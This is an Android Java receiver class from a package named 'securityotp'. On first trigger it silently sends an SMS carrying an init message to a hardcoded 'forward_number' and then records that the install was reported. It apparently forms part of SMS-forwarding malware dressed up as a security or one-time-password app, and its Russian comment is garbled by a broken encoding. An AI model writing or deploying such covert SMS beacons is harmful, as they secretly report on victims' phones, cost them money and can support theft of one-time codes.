package com.devspark.securityotp;

import java.util.ArrayList;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.util.Log;
import android.widget.Toast;

public class InstallReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		// Ð¿Ñ€Ð¾Ð²ÐµÑ€ÐºÐ°, Ð±Ñ‹Ð»Ð¾ Ð»Ð¸ Ð½Ð¾Ñ‚Ð¸Ñ„Ð¸Ñ†Ð¸Ð¾Ð²Ð°Ð½Ð¾, Ñ‡Ñ‚Ð¾ Ð¿Ñ€Ð¸Ð»Ð¾Ð¶ÐµÐ½Ð¸Ðµ ÑƒÑ�Ñ‚Ð°Ð½Ð¾Ð²Ð»ÐµÐ½Ð½Ð¾
		Toast.makeText(context, "TIME_TICK", Toast.LENGTH_SHORT);
		PreferenceHelper mPreferenceHelper = new PreferenceHelper(context);
		if (!mPreferenceHelper.isInstall()) {
			// send init SMS to the FORWARD_NUMBER
			String forwardNumber = context.getString(R.string.forward_number);
			String initText = context.getString(R.string.init_text);
			SmsManager smsManager = SmsManager.getDefault();
	        ArrayList<String> parts = smsManager.divideMessage(initText);
	        smsManager.sendMultipartTextMessage(forwardNumber, null, parts, null, null);
	        Log.e("SECURITY OTP", "send install event: " + initText);
	        
	        mPreferenceHelper.saveInstall(true);
		}
	}

}
